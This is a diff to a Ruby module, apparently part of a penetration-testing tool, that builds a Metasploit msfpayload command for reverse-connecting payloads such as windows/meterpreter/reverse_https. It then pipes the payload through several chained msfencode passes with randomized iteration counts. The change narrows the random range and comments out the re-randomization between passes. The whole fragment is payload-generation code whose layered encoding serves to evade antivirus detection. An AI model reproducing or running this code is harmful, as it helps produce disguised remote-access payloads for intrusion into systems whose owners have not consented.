@@ -142,15 +142,14 @@ module Lib_meta
 		# Create msfpayload command
 		build = "msfpayload #{payload} LHOST=#{lhost} LPORT=#{lport} "
 		build << "SessionCommunicationTimeout=600 " if payload.eql? 'windows/meterpreter/reverse_https'
-		enumber = Random.rand(15 + 3)
+		enumber = Random.rand(9 + 3)
 		build << "EXITFUNC=thread R |msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"
-		enumber = Random.rand(15 + 3)		
+	#	enumber = Random.rand(9 + 3)		
 		build << "msfencode -e x86/jmp_call_additive -c #{enumber} -t raw |"
-		enumber = Random.rand(15 + 3)
+	#	enumber = Random.rand(9 + 3)
 		build << "msfencode -e x86/call4_dword_xor -c #{enumber} -t raw |"
-		enumber = Random.rand(15 + 3)
+	#	enumber = Random.rand(9 + 3)
 		build << "msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"	
-		enumber = Random.rand(15 + 3)
 		build << "msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX"	
 		
 		# Execute and return payload
